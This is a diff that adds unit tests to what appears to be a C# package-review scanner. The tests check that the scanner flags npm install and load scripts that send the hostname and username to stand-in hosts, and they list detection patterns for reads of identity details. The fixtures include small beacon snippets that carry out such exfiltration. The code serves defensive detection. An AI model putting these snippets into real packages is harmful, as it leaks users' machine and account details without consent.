@@ -50,6 +50,53 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script" } && f.Detail.Contains("host details", StringComparison.Ordinal));
     }
 
+    [Fact]
+    public void A_preinstall_sending_a_destructured_os_hostname_is_noteworthy()
+    {
+        var r = Review(Tgz("sample-gateway-1.0.0.tgz",
+            ("package/package.json", """{"name":"sample-gateway","version":"1.0.0","scripts":{"preinstall":"node i.js"}}"""),
+            ("package/i.js", "const https = require('https');\nconst { hostname } = require('os');\nhttps.request({ host: 'h.example.invalid' }).end(hostname());")));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/host-details", Path: "package/i.js" });
+        Assert.Contains(r.Findings, f => f is { Rule: "package/install-network-collect", Level: "noteworthy" } && f.Detail.Contains("host details", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void A_preinstall_that_downloads_into_the_home_directory_does_not_collect_host_details()
+    {
+        var r = Review(Tgz("sample-prebuilt-1.0.0.tgz",
+            ("package/package.json", """{"name":"sample-prebuilt","version":"1.0.0","scripts":{"preinstall":"node i.js"}}"""),
+            ("package/i.js", "const https = require('https'), fs = require('fs'), path = require('path');\nconst { homedir } = require('os');\nhttps.get('https://dl.example.invalid/tool.tar.gz', res => res.pipe(fs.createWriteStream(path.join(homedir(), '.cache', 'tool.tar.gz'))));")));
+        Assert.DoesNotContain(r.Findings, f => f.Rule == "package/install-network-collect");
+    }
+
+    [Fact]
+    public void A_main_that_sends_inline_os_identity_when_loaded_is_a_load_beacon()
+    {
+        var r = Review(Tgz("sample-status-1.0.0.tgz", ("package/package.json", """{"name":"sample-status","version":"1.0.0","main":"index.js"}"""),
+            ("package/index.js", "const https = require('https');\nconst h = require('os').hostname(), u = require('os').userInfo().username;\nhttps.get('https://status.example.invalid/?h=' + h + '&u=' + u);")));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/load-beacon", Level: "noteworthy" });
+        const string bare = "const https=require('https');const{hostname:e,userInfo:t}=require('os');https.get('https://status.example.invalid/?h='+e()+'&u='+t().username);";
+        Assert.Contains(PackageReview.Scan("index.js", bare, install: false, default, entry: true, peel: false), f => f.Rule == "package/load-beacon");
+    }
+
+    [Fact]
+    public void Inline_os_calls_and_identity_reads_count_as_host_details()
+    {
+        const string hostDetails = "reads host and user details";
+        Assert.Contains(Details("const u = require('os').userInfo().username;"), d => d == hostDetails);
+        Assert.Contains(Details("user = os.getlogin()"), d => d == hostDetails);
+        Assert.Contains(Details("const e = run(\"git config --global user.email\");"), d => d == hostDetails);
+        Assert.Contains(Details("execSync('ssh -T git@example.invalid')"), d => d == hostDetails);
+        Assert.Contains(Details("const { homedir: h, userInfo } = require('node:os');\nlog(userInfo());"), d => d == hostDetails);
+        Assert.Contains(Details("const{hostname:e}=require(\"os\");send(e())"), d => d == hostDetails);
+        Assert.Contains(Details("import { userInfo as u } from 'node:os';\nlog(u());"), d => d == hostDetails);
+        Assert.DoesNotContain(Details("const{platform:hostname}=require('os');hostname()"), d => d == hostDetails);
+        Assert.DoesNotContain(Details("const { homedir } = require('os');\nconst dir = homedir();"), d => d == hostDetails);
+        Assert.DoesNotContain(Details("git config --global user.name \"Sample Builder\""), d => d == hostDetails);
+        Assert.DoesNotContain(Details("const { platform } = require('os');\nconst hostname = () => 'h';\nhostname();"), d => d == hostDetails);
+        Assert.DoesNotContain(Details("const { hostname } = require('os');\nurl.hostname();"), d => d == hostDetails);
+    }
+
     private string Nupkg(string name, string script) => Zip(name,
         ("Sample.Tools.nuspec", U("""<?xml version="1.0"?><package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd"><metadata><id>Sample.Tools</id><version>1.0.0</version><authors>Sample</authors><description>Build helpers.</description></metadata></package>""")),
         ("lib/net8.0/Sample.Tools.dll", [0x4D, 0x5A, 0x90, 0x00]),
